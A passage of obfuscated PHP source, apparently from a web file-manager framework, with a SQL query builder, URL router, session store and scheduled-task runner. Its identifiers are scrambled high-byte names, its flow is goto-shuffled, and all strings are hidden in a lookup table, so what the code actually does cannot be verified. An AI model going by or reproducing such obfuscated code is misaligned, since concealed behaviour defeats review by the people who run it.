$F›Õ‹ŸΩŸ©[33]); return $this->execute($fâÛ¶éÚãâ, $this->parseBind(!empty($f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[272]]) ? $f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[272]] : array())); goto Bä√ñäÓÙÃ; FÁ¿∫™„‚º: $F›Õ‹ŸΩŸ© =& $_SERVER[∞„˜ƒÑºª]; $e˜ò¥∑‹˜Â = $b¯ò∑ÁÔÇà = array(); $this->model = $f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[268]]; goto d¥àºãØï€; d¥àºãØï€: foreach ($A‡ö»Ÿ∆äö as $Añ·óÀ⁄⁄û => $B‡äû∑πÆî) { if (is_array($B‡äû∑πÆî) && $F›Õ‹ŸΩŸ©[284] == $B‡äû∑πÆî[0]) { $b¯ò∑ÁÔÇà[] = $this->parseKey($Añ·óÀ⁄⁄û); $e˜ò¥∑‹˜Â[] = $B‡äû∑πÆî[1]; } elseif (is_scalar($B‡äû∑πÆî) || is_null($B‡äû∑πÆî)) { $b¯ò∑ÁÔÇà[] = $this->parseKey($Añ·óÀ⁄⁄û); $e˜ò¥∑‹˜Â[] = $this->parseValue($B‡äû∑πÆî); } } $fâÛ¶éÚãâ = ($dÊØ‘Éåë≥ ? $F›Õ‹ŸΩŸ©[578] : $F›Õ‹ŸΩŸ©[579]) . $F›Õ‹ŸΩŸ©[580] . $this->parseTable($f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[266]]) . $F›Õ‹ŸΩŸ©[574] . implode($F›Õ‹ŸΩŸ©[47], $b¯ò∑ÁÔÇà) . $F›Õ‹ŸΩŸ©[575] . implode($F›Õ‹ŸΩŸ©[47], $e˜ò¥∑‹˜Â) . $F›Õ‹ŸΩŸ©[576]; $fâÛ¶éÚãâ .= $this->parseLock(isset($f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[536]]) ? $f˘Ø≥ùã»Ω[$F›Õ‹ŸΩŸ©[536]] : !1); goto fØ†Èøã¨Ê; Bä√ñäÓÙÃ: } public function selectInsert($D’™ãµ‡™≥, $b–é†üÜ¡É, $b±∂òôéÕ© = array()) { goto bœ°èÓ™§Ø; bœ°èÓ™§Ø: $f¥∂Ùé¡∏∞ =& $_SERVER[∞„˜ƒÑºª]; $this->model = $b±∂òôéÕ©[$f¥∂Ùé¡∏∞[268]]; if (is_string($D’™ãµ‡™≥)) { $D’™ãµ‡™≥ = explode($f¥∂Ùé¡∏∞[47], $D’™ãµ‡™≥); } goto A¡ÌíÛüö¿; eúí˜∑∏æ‚: return $this->execute($a¬ë⁄ÊåÙ÷, $this->parseBind(!empty($b±∂òôéÕ©[$f¥∂Ùé¡∏∞[272]]) ? $b±∂òôéÕ©[$f¥∂Ùé¡∏∞[272]] : array())); goto eê–úÁªùô; A¡ÌíÛüö¿: array_walk($D’™ãµ‡™≥, array($this, $f¥∂Ùé¡∏∞[577])); $a¬ë⁄ÊåÙ÷ = $f¥∂Ùé¡∏∞[713] . $this->parseTable($b–é†üÜ¡É) . $f¥∂Ùé¡∏∞[574] . implode($f¥∂Ùé¡∏∞[47], $D’™ãµ‡™≥) . $f¥∂Ùé¡∏∞[692]; $a¬ë⁄ÊåÙ÷ .= $this->buildSelectSql($b±∂òôéÕ©); goto eúí˜∑∏æ‚; eê–úÁªùô: } public function update($CÃœÁ‡¶±‰, $e≤ÖÛ‹–®∏) { $b¿ óÛÊà¯ =& $_SERVER[∞„˜ƒÑºª]; $this->model = $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[268]]; $DËàÑ˘≤ê≤ = $b¿ óÛÊà¯[714] . $this->parseTable($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[266]]) . $this->parseSet($CÃœÁ‡¶±‰) . $this->parseWhere(!empty($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[262]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[262]] : $b¿ óÛÊà¯[33]) . $this->parseOrder(!empty($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[350]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[350]] : $b¿ óÛÊà¯[33]) . $this->parseLimit(!empty($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[279]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[279]] : $b¿ óÛÊà¯[33]) . $this->parseLock(isset($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[536]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[536]] : !1) . $this->parseComment(!empty($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[339]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[339]] : $b¿ óÛÊà¯[33]); return $this->execute($DËàÑ˘≤ê≤, $this->parseBind(!empty($e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[272]]) ? $e≤ÖÛ‹–®∏[$b¿ óÛÊà¯[272]] : array())); } public function delete($Bó≤›ÿ◊‡È = array()) { $EÙ¿´⁄˜’’ =& $_SERVER[∞„˜ƒÑºª]; $this->model = $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[268]]; $EÙâøÛ«üı = $EÙ¿´⁄˜’’[715] . $this->parseTable($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[266]]) . $this->parseWhere(!empty($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[262]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[262]] : $EÙ¿´⁄˜’’[33]) . $this->parseOrder(!empty($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[350]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[350]] : $EÙ¿´⁄˜’’[33]) . $this->parseLimit(!empty($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[279]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[279]] : $EÙ¿´⁄˜’’[33]) . $this->parseLock(isset($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[536]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[536]] : !1) . $this->parseComment(!empty($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[339]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[339]] : $EÙ¿´⁄˜’’[33]); return $this->execute($EÙâøÛ«üı, $this->parseBind(!empty($Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[272]]) ? $Bó≤›ÿ◊‡È[$EÙ¿´⁄˜’’[272]] : array())); } public function select($AÏü—€⁄Ç‹ = array()) { goto CÒ›÷∏Öøÿ; CÒ›÷∏Öøÿ: $C±Ÿô„ç€› =& $_SERVER[∞„˜ƒÑºª]; $this->model = $AÏü—€⁄Ç‹[$C±Ÿô„ç€›[268]]; $B≈â´êêÖ™ = $this->buildSelectSql($AÏü—€⁄Ç‹); goto CÃ∫öΩŒ‡≤; CÃ∫öΩŒ‡≤: $d±‘√ßı≈Ê = isset($AÏü—€⁄Ç‹[$C±Ÿô„ç€›[336]]) ? $AÏü—€⁄Ç‹[$C±Ÿô„ç€›[336]] : !1; if ($d±‘√ßı≈Ê) { $aø¬Ωƒ∏Ì¨ = is_string($d±‘√ßı≈Ê[$C±Ÿô„ç€›[96]]) ? $d±‘√ßı≈Ê[$C±Ÿô„ç€›[96]] : $C±Ÿô„ç€›[716] . md5($B≈â´êêÖ™); $BãääÑªÍ’ = think_cache($aø¬Ωƒ∏Ì¨, $C±Ÿô„ç€›[33], $d±‘√ßı≈Ê); if (!1 !== $BãääÑªÍ’) { return $BãääÑªÍ’; } } $DâäÒÿ∞Ÿº = $this->query($B≈â´êêÖ™, $this->parseBind(!empty($AÏü—€⁄Ç‹[$C±Ÿô„ç€›[272]]) ? $AÏü—€⁄Ç‹[$C±Ÿô„ç€›[272]] : array())); goto f¥úÏúáäü; f¥úÏúáäü: if ($d±‘√ßı≈Ê && !1 !== $DâäÒÿ∞Ÿº) { think_cache($aø¬Ωƒ∏Ì¨, $DâäÒÿ∞Ÿº, $d±‘√ßı≈Ê); } return $DâäÒÿ∞Ÿº; goto c⁄íËºê¶; c⁄íËºê¶: } public function buildSelectSql($d◊Öıî¬à÷ = array()) { goto b∆Ìª¿àñá; bÚ…îØπØÒ: return $Cê‡ˆÂÜÛ≤; goto cüﬂŒµ››∞; AˆàáøÁ‘æ: $Cê‡ˆÂÜÛ≤ = $this->parseSql($this->selectSql, $d◊Öıî¬à÷); $Cê‡ˆÂÜÛ≤ .= $this->parseLock(isset($d◊Öıî¬à÷[$Eë»Íú–æë[536]]) ? $d◊Öıî¬à÷[$Eë»Íú–æë[536]] : !1); if (isset($Aç†ä…µÓï)) { think_cache($Aç†ä…µÓï, $Cê‡ˆÂÜÛ≤); } goto bÚ…îØπØÒ; b∆Ìª¿àñá: $Eë»Íú–æë =& $_SERVER[∞„˜ƒÑºª]; if (isset($d◊Öıî¬à÷[$Eë»Íú–æë[338]])) { if (strpos($d◊Öıî¬à÷[$Eë»Íú–æë[338]], $Eë»Íú–æë[47])) { list($Aø¯ﬂóÑË”, $B÷‘”Æ∆∏π) = explode($Eë»Íú–æë[47], $d◊Öıî¬à÷[$Eë»Íú–æë[338]]); } else { $Aø¯ﬂóÑË” = $d◊Öıî¬à÷[$Eë»Íú–æë[338]]; } $Aø¯ﬂóÑË” = $Aø¯ﬂóÑË” ? $Aø¯ﬂóÑË” : 1; $B÷‘”Æ∆∏π = isset($B÷‘”Æ∆∏π) ? $B÷‘”Æ∆∏π : (is_numeric($d◊Öıî¬à÷[$Eë»Íú–æë[279]]) ? $d◊Öıî¬à÷[$Eë»Íú–æë[279]] : 20); $c»¥‹Œ”æ∏ = $B÷‘”Æ∆∏π * ((int) $Aø¯ﬂóÑË” - 1); $d◊Öıî¬à÷[$Eë»Íú–æë[279]] = $c»¥‹Œ”æ∏ . $Eë»Íú–æë[47] . $B÷‘”Æ∆∏π; } if (think_config($Eë»Íú–æë[717])) { $Aç†ä…µÓï = $Eë»Íú–æë[718] . md5(serialize($d◊Öıî¬à÷)); $f∂∂¶ùÑîã = think_cache($Aç†ä…µÓï); if ($f∂∂¶ùÑîã) { return $f∂∂¶ùÑîã; } } goto AˆàáøÁ‘æ; cüﬂŒµ››∞: } public function parseSql($b‚Ÿ€êÀö∞, $E¿±‡Ï¢†» = array()) { $A…Œ◊øÇçØ =& $_SERVER[∞„˜ƒÑºª]; $b‚Ÿ€êÀö∞ = str_replace(array($A…Œ◊øÇçØ[719], $A…Œ◊øÇçØ[720], $A…Œ◊øÇçØ[721], $A…Œ◊øÇçØ[722], $A…Œ◊øÇçØ[723], $A…Œ◊øÇçØ[724], $A…Œ◊øÇçØ[725], $A…Œ◊øÇçØ[726], $A…Œ◊øÇçØ[727], $A…Œ◊øÇçØ[728], $A…Œ◊øÇçØ[729]), array($this->parseTable("{$E¿±‡Ï¢†»[$A…Œ◊øÇçØ[266]]}"), $this->parseDistinct(isset($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[730]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[730]] : !1), $this->parseField(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[260]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[260]] : $A…Œ◊øÇçØ[172]), $this->parseJoin(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[269]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[269]] : $A…Œ◊øÇçØ[33]), $this->parseWhere(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[262]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[262]] : $A…Œ◊øÇçØ[33]), $this->parseGroup(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[731]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[731]] : $A…Œ◊øÇçØ[33]), $this->parseHaving(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[732]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[732]] : $A…Œ◊øÇçØ[33]), $this->parseOrder(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[350]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[350]] : $A…Œ◊øÇçØ[33]), $this->parseLimit(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[279]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[279]] : $A…Œ◊øÇçØ[33]), $this->parseUnion(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[334]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[334]] : $A…Œ◊øÇçØ[33]), $this->parseComment(!empty($E¿±‡Ï¢†»[$A…Œ◊øÇçØ[339]]) ? $E¿±‡Ï¢†»[$A…Œ◊øÇçØ[339]] : $A…Œ◊øÇçØ[33])), $b‚Ÿ€êÀö∞); return $b‚Ÿ€êÀö∞; } public function getLastSql($fîŒøú≠¿ë = '') { return $fîŒøú≠¿ë ? $this->modelSql[$fîŒøú≠¿ë] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($d≠Í°‹ÿﬁø) { return addslashes($d≠Í°‹ÿﬁø); } public function setModel($c¯ï÷’«êº) { $this->model = $c¯ï÷’«êº; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto CâÊåªÌÌø; aÕ∏é‚È√ï: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\x5e\57\135\53", "\x3a\156\x75\x6d" => "\x5b\x30\55\x39\135\53", "\x3a\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($E˘Ã≥®ŒÏΩ, $Aµé∑¥”Ö) { $a≠π®Í–ßÇ =& $_SERVER[∞„˜ƒÑºª]; if ($E˘Ã≥®ŒÏΩ == $a≠π®Í–ßÇ[1015]) { $eı‚Ö£ìı≠ = array_map($a≠π®Í–ßÇ[1016], $Aµé∑¥”Ö[0]); $E–ãœ‡Ñá† = strpos($Aµé∑¥”Ö[1], $a≠π®Í–ßÇ[8]) === 0 ? $Aµé∑¥”Ö[1] : $a≠π®Í–ßÇ[8] . $Aµé∑¥”Ö[1]; $A∫ª≥ëááÑ = $Aµé∑¥”Ö[2]; } else { $eı‚Ö£ìı≠ = null; $E–ãœ‡Ñá† = strpos($Aµé∑¥”Ö[0], $a≠π®Í–ßÇ[8]) === 0 ? $Aµé∑¥”Ö[0] : $a≠π®Í–ßÇ[8] . $Aµé∑¥”Ö[0]; $A∫ª≥ëááÑ = $Aµé∑¥”Ö[1]; } array_push(self::$maps, $eı‚Ö£ìı≠); array_push(self::$routes, $E–ãœ‡Ñá†); array_push(self::$methods, strtoupper($E˘Ã≥®ŒÏΩ)); array_push(self::$callbacks, $A∫ª≥ëááÑ); } public static function error($e∞˘öÉïß) { self::$errorCallback = $e∞˘öÉïß; } public static function haltOnMatch($aﬁ® â…§ç = true) { self::$halts = $aﬁ® â…§ç; } public static function dispatch() { goto FÒÌ„á‰ì∑; f’£«Ø•é: $A÷â¯Áﬂõñ = array_keys(static::$patterns); $cäÓ∂Úù © = array_values(static::$patterns); $fΩ·œ–ÿ∑⁄ = !1; goto fƒö´àÖÿ÷; FÒÌ„á‰ì∑: $DœÿÜöÖ≥† =& $_SERVER[∞„˜ƒÑºª]; $a≠Ωã˜êÇÿ = parse_url($_SERVER[$DœÿÜöÖ≥†[436]], PHP_URL_PATH); $a≤Ûîπ…æ = $_SERVER[$DœÿÜöÖ≥†[150]]; goto f’£«Ø•é; fƒö´àÖÿ÷: self::$routes = preg_replace($DœÿÜöÖ≥†[799], $DœÿÜöÖ≥†[8], self::$routes); if (in_array($a≠Ωã˜êÇÿ, self::$routes)) { $Dˆ≥õé·±ø = array_keys(self::$routes, $a≠Ωã˜êÇÿ); foreach ($Dˆ≥õé·±ø as $Bóƒü∆à¨ù) { if (self::$methods[$Bóƒü∆à¨ù] == $a≤Ûîπ…æ || self::$methods[$Bóƒü∆à¨ù] == $DœÿÜöÖ≥†[1017] || in_array($a≤Ûîπ…æ, self::$maps[$Bóƒü∆à¨ù])) { $fΩ·œ–ÿ∑⁄ = !0; if (!is_object(self::$callbacks[$Bóƒü∆à¨ù])) { $Cß”¡√€ñ√ = explode($DœÿÜöÖ≥†[8], self::$callbacks[$Bóƒü∆à¨ù]); $aáﬁˆ⁄Ç÷ç = end($Cß”¡√€ñ√); $Aæñê‹∫ï„ = explode($DœÿÜöÖ≥†[1018], $aáﬁˆ⁄Ç÷ç); $eÃƒÉïÛÖö = new $Aæñê‹∫ï„[0](); $eÃƒÉïÛÖö->{$Aæñê‹∫ï„[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Bóƒü∆à¨ù]); if (self::$halts) { return; } } } } } else { $bœ‰ à‘Œ• = 0; foreach (self::$routes as $Bóƒü∆à¨ù) { if (strpos($Bóƒü∆à¨ù, $DœÿÜöÖ≥†[4]) !== !1) { $Bóƒü∆à¨ù = str_replace($A÷â¯Áﬂõñ, $cäÓ∂Úù ©, $Bóƒü∆à¨ù); } if (preg_match($DœÿÜöÖ≥†[1019] . $Bóƒü∆à¨ù . $DœÿÜöÖ≥†[1020], $a≠Ωã˜êÇÿ, $D∑È≈Ï◊„·)) { if (self::$methods[$bœ‰ à‘Œ•] == $a≤Ûîπ…æ || self::$methods[$bœ‰ à‘Œ•] == $DœÿÜöÖ≥†[1017] || !empty(self::$maps[$bœ‰ à‘Œ•]) && in_array($a≤Ûîπ…æ, self::$maps[$bœ‰ à‘Œ•])) { $fΩ·œ–ÿ∑⁄ = !0; array_shift($D∑È≈Ï◊„·); if (!is_object(self::$callbacks[$bœ‰ à‘Œ•])) { $Cß”¡√€ñ√ = explode($DœÿÜöÖ≥†[8], self::$callbacks[$bœ‰ à‘Œ•]); $aáﬁˆ⁄Ç÷ç = end($Cß”¡√€ñ√); $Aæñê‹∫ï„ = explode($DœÿÜöÖ≥†[1018], $aáﬁˆ⁄Ç÷ç); $eÃƒÉïÛÖö = new $Aæñê‹∫ï„[0](); if (!method_exists($eÃƒÉïÛÖö, $Aæñê‹∫ï„[1])) { echo $DœÿÜöÖ≥†[1021]; } else { call_user_func_array(array($eÃƒÉïÛÖö, $Aæñê‹∫ï„[1]), $D∑È≈Ï◊„·); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bœ‰ à‘Œ•], $D∑È≈Ï◊„·); if (self::$halts) { return; } } } } $bœ‰ à‘Œ•++; } } if ($fΩ·œ–ÿ∑⁄ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $a∏‡úÿÔæÇ =& $_SERVER[∞„˜ƒÑºª]; header($_SERVER[$a∏‡úÿÔæÇ[1022]] . $a∏‡úÿÔæÇ[1023]); echo $a∏‡úÿÔæÇ[1024]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$DœÿÜöÖ≥†[436]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto bÆÖ–ßÀ‘≤; bÆÖ–ßÀ‘≤: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eáûπ≈∏≠è; bã„ùâ§¢±: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $b™áÔ™ﬂ¿ô = $e∆•éÂπù˘[$CÑè™ÇóÍ”[1026]]; $bÜΩﬂ Çîπ = $e∆•éÂπù˘[$b™áÔ™ﬂ¿ô]; goto fíÇ‡áÓàµ; d∑Ëı∫¥Ë¯: $A®–÷‰óÇ’ = new self(); return $A®–÷‰óÇ’; goto a∂∞˜√ê‹ª; fíÇ‡áÓàµ: $fÕÏ”˘‡ÚÊ = $e∆•éÂπù˘[$CÑè™ÇóÍ”[522]]; switch ($b™áÔ™ﬂ¿ô) { case $CÑè™ÇóÍ”[17]: self::$handle = Model($CÑè™ÇóÍ”[523]); break; case $CÑè™ÇóÍ”[524]: self::$handle = new CacheRedis($bÜΩﬂ Çîπ, $fÕÏ”˘‡ÚÊ); break; case $CÑè™ÇóÍ”[525]: self::$handle = new CacheMemcached($bÜΩﬂ Çîπ, $fÕÏ”˘‡ÚÊ); break; case $CÑè™ÇóÍ”[163]: $bÜΩﬂ Çîπ[$CÑè™ÇóÍ”[84]] = $bÜΩﬂ Çîπ[$CÑè™ÇóÍ”[84]] . $CÑè™ÇóÍ”[1027]; self::$handle = new CacheFile($bÜΩﬂ Çîπ, $fÕÏ”˘‡ÚÊ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto d∑Ëı∫¥Ë¯; eáûπ≈∏≠è: $CÑè™ÇóÍ” =& $_SERVER[∞„˜ƒÑºª]; static $A®–÷‰óÇ’ = false; if ($A®–÷‰óÇ’) { return $A®–÷‰óÇ’; } goto F¯†√≥’øæ; F¯†√≥’øæ: $e∆•éÂπù˘ = $GLOBALS[$CÑè™ÇóÍ”[6]][$CÑè™ÇóÍ”[336]]; self::$sessionTime = $e∆•éÂπù˘[$CÑè™ÇóÍ”[1025]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto bã„ùâ§¢±; a∂∞˜√ê‹ª: } public static function sign($BÿßÉﬂ÷∏¬ = false) { $BÿßÉﬂ÷∏¬ && (self::$sessionSign = $BÿßÉﬂ÷∏¬); self::init(); return self::$sessionSign; } public static function set($f∆ì∑¨ê‰Î, $AûäëπÌúß = false) { self::init(); if (is_array($f∆ì∑¨ê‰Î)) { foreach ($f∆ì∑¨ê‰Î as $F‚•ÃèÛÆÿ => $a”‚ÉÖÕ©û) { array_set_value(self::$data, $F‚•ÃèÛÆÿ, $a”‚ÉÖÕ©û); } } else { array_set_value(self::$data, $f∆ì∑¨ê‰Î, $AûäëπÌúß); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($b—€∑”ÂÜì = false) { self::init(); if (!$b—€∑”ÂÜì) { return self::$data; } return array_get_value(self::$data, $b—€∑”ÂÜì); } public static function remove($A¡∏çÉ¯Ù—) { self::init(); unset(self::$data[$A¡∏çÉ¯Ù—]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[∞„˜ƒÑºª][527])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto AÁÍ◊ªíŒè; AÁÍ◊ªíŒè: $a’ª•◊—‚› =& $_SERVER[∞„˜ƒÑºª]; if (self::valueGet($a’ª•◊—‚›[445]) != $a’ª•◊—‚›[376]) { return; } if (self::valueGet($a’ª•◊—‚›[1028]) == $a’ª•◊—‚›[376]) { $a∞èñë∫ª = self::valueGet($a’ª•◊—‚›[1029]); if (time() - $a∞èñë∫ª > 3600 * 2) { self::restart(); } return; } goto d∆Õ∆ú…ßª; d∆Õ∆ú…ßª: http_close(); self::valueSet($a’ª•◊—‚›[1028], $a’ª•◊—‚›[376]); Hook::bind($a’ª•◊—‚›[1030], $a’ª•◊—‚›[1031]); goto c¨∆•ç’∞ú; c¨∆•ç’∞ú: while (!0) { self::cacheClear(); if (self::valueGet($a’ª•◊—‚›[445]) != $a’ª•◊—‚›[376]) { self::valueSet($a’ª•◊—‚›[1028], $a’ª•◊—‚›[402]); self::log($a’ª•◊—‚›[1032]); die; } self::valueSet($a’ª•◊—‚›[1028], $a’ª•◊—‚›[376]); self::valueSet($a’ª•◊—‚›[1029], time()); self::taskRunAll(); sleep(self::valueGet($a’ª•◊—‚›[1033])); } goto f¨ŒØ”…Ì∂; f¨ŒØ”…Ì∂: } public static function restart() { $bäÆ∫™ö∫≤ =& $_SERVER[∞„˜ƒÑºª]; http_close(); self::valueSet($bäÆ∫™ö∫≤[445], $bäÆ∫™ö∫≤[402]); sleep(self::valueGet($bäÆ∫™ö∫≤[1033]) + 5); self::valueSet($bäÆ∫™ö∫≤[1028], $bäÆ∫™ö∫≤[402]); self::valueSet($bäÆ∫™ö∫≤[445], $bäÆ∫™ö∫≤[376]); } public static function shutdownEvent() { $bÆ¢ë‹ÊÊä =& $_SERVER[∞„˜ƒÑºª]; self::valueSet($bÆ¢ë‹ÊÊä[1028], $bÆ¢ë‹ÊÊä[402]); self::log($bÆ¢ë‹ÊÊä[1034]); } public static function config($cº‘ùûâ≈, $b∆–àƒ∏üÀ) { $aﬁΩ√ÿë∫£ =& $_SERVER[∞„˜ƒÑºª]; $CÓ… ëÌÿå = 20; $b∆–àƒ∏üÀ = intval($b∆–àƒ∏üÀ) <= $CÓ… ëÌÿå ? $CÓ… ëÌÿå : intval($b∆–àƒ∏üÀ); self::valueSet($aﬁΩ√ÿë∫£[445], $cº‘ùûâ≈); self::valueSet($aﬁΩ√ÿë∫£[1033], $b∆–àƒ∏üÀ); } private static function taskRunAll() { $bØ„€ú¨–ë =& $_SERVER[∞„˜ƒÑºª]; $Bøπä”·øì = Model($bØ„€ú¨–ë[1035])->listData(); $Càúë©√ó = count($Bøπä”·øì); for ($Aö“ππÊ÷ = 0; $Aö“ππÊ÷ < $Càúë©√ó; $Aö“ππÊ÷++) { $cÁÇïç÷íá = $Bøπä”·øì[$Aö“ππÊ÷]; if ($cÁÇïç÷íá[$bØ„€ú¨–ë[1036]] != $bØ„€ú¨–ë[376]) { continue; } if (!self::taskTimeCheck($cÁÇïç÷íá)) { continue; } self::taskRun($cÁÇïç÷íá); } } private static function taskTimeCheck($DéÙåé‹“ﬂ) { goto f™ìÎ≠Úæ§; f™ìÎ≠Úæ§: $C¥ããπ√à≠ =& $_SERVER[∞„˜ƒÑºª]; $Dòﬁ“è€É´ = json_decode($DéÙåé‹“ﬂ[$C¥ããπ√à≠[186]], !0); $cí˘Ô°òıú = intval($DéÙåé‹“ﬂ[$C¥ããπ√à≠[1029]]); goto cœ¿†≠¬“ê; cœ¿†≠¬“ê: $a‰»¬≈—∑Ï = strtotime($C¥ããπ√à≠[1037] . $Dòﬁ“è€É´[$C¥ããπ√à≠[1038]] . $C¥ããπ√à≠[1039]) - strtotime($C¥ããπ√à≠[1040]); $eñ◊ÖùâÈ∫ = time() - strtotime(date($C¥ããπ√à≠[1041]) . $C¥ããπ√à≠[1042]); $E¬äÖèª∏… = $eñ◊ÖùâÈ∫ >= $a‰»¬≈—∑Ï && $eñ◊ÖùâÈ∫ <= $a‰»¬≈—∑Ï + 3600; goto DÍ≈“¯°Õø; DÍ≈“¯°Õø: switch ($Dòﬁ“è€É´[$C¥ããπ√à≠[29]]) { case $C¥ããπ√à≠[1043]: if (time() - $cí˘Ô°òıú < 3600 * 24 * 30) { return !1; } if ($Dòﬁ“è€É´[$C¥ããπ√à≠[1043]] == date($C¥ããπ√à≠[1044]) && $E¬äÖèª∏…) { return !0; } break; case $C¥ããπ√à≠[1045]: if (time() - $cí˘Ô°òıú < 3600 * 24 * 7) { return !1; } $B ÖóìßÁ› = date($C¥ããπ√à≠[1046]) == 0 ? 7 : date($C¥ããπ√à≠[1046]); if ($Dòﬁ“è€É´[$C¥ããπ√à≠[1045]] == $B ÖóìßÁ› && $E¬äÖèª∏…) { return !0; } break; case $C¥ããπ√à≠[1038]: if (time() - $cí˘Ô°òıú < 3600 * 24) { return !1; } if ($E¬äÖèª∏…) { return !0; } break; case $C¥ããπ√à≠[1047]: if (time() - $cí˘Ô°òıú >= floatval($Dòﬁ“è€É´[$C¥ããπ√à≠[1047]]) * 60) { return !0; } break; default: break; } return !1; goto aﬂôà÷æ®¯; aﬂôà÷æ®¯: } public static function taskRun($dÉˆñ’¥“Ω) { goto EÛé∂≈ÔÌ†; D å« èáÏ: Model($d¯‘äóÉ±î[1052])->add(array($d¯‘äóÉ±î[1053] => $d¯‘äóÉ±î[33], $d¯‘äóÉ±î[1054] => $d¯‘äóÉ±î[402], $d¯‘äóÉ±î[29] => $d¯‘äóÉ±î[1055] . $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[366]], $d¯‘äóÉ±î[1056] => json_encode(array($d¯‘äóÉ±î[28] => $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[28]], $d¯‘äóÉ±î[1057] => timeFloat() - $EßúôÆöÀŒ, $d¯‘äóÉ±î[280] => $fµŸ¡»ÒÏê)))); self::log($d¯‘äóÉ±î[1058] . $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[366]] . $d¯‘äóÉ±î[1059] . $fµŸ¡»ÒÏê); return !0; goto c´√ÿ–ÒÊﬂ; EÛé∂≈ÔÌ†: $d¯‘äóÉ±î =& $_SERVER[∞„˜ƒÑºª]; self::log($d¯‘äóÉ±î[1048] . $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[366]] . $d¯‘äóÉ±î[1049] . $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[28]] . $d¯‘äóÉ±î[1050] . $dÉˆñ’¥“Ω[$d¯‘äóÉ±î[1051]]); Model($d¯‘äóÉ±î[1035])->run($dÉˆñ’¥“Ω[$d¯‘äóÉ±î[366]]); goto cÍƒüîÓÊü; cÍƒüîÓÊü: $EßúôÆöÀŒ = timeFloat(); 